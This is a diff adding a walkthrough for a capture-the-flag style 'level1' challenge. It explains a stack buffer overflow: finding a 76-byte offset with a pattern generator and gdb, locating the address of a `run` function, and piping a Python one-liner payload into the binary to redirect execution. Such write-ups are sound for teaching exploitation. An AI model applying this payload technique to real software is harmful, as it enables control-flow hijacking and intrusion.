@@ -1,0 +1,61 @@
+Walkthrough: Exploiting Buffer Overflow (level1)
+
+Objective:
+Gain control of the instruction pointer to call the `run` function in the binary.
+
+---
+
+Step 1: Identify the Offset
+Use the pattern generator tool to identify where the return address is overwritten.
+
+Tool used:
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+Generate a unique pattern string (e.g., 100-150 characters) and use it as input to the program.
+Example:
+    ./level1
+    [Paste the generated pattern]
+
+Then run the program under a debugger (like gdb), and when it crashes, examine the value of EIP to find where the pattern overwrote the return address.
+
+Inside gdb:
+    (gdb) run
+    (after crash)
+    (gdb) info registers eip
+    EIP = 0x[crashed_address]
+
+Take that address and find its offset in the pattern using the same tool.
+
+For this example, the offset is found to be 76 bytes.
+
+---
+
+Step 2: Get the Address of the `run` Function
+
+Use gdb to inspect the address of the `run` function:
+    (gdb) p run
+    $1 = {<text variable, no debug info>} 0x8048444 <run>
+
+This is the function we want to redirect execution to.
+
+---
+
+Step 3: Construct the Exploit Payload
+
+Now that we know the offset (76 bytes) and the address of the target function (0x8048444), we can craft the payload.
+
+Payload structure:
+    [76 bytes of filler] + [address of run in little endian]
+
+In Python:
+    python -c "print('A' * 76 + '\x44\x84\x04\x08')"
+
+Then pipe the payload into the program:
+    (python -c "print('A' * 76 + '\x44\x84\x04\x08')" && cat) | ./level1
+
+This sends the exploit payload followed by standard input, triggering the call to `run()`.
+
+---
+
+Result:
+If successful, the program will jump to the `run()` function, completing the challenge.
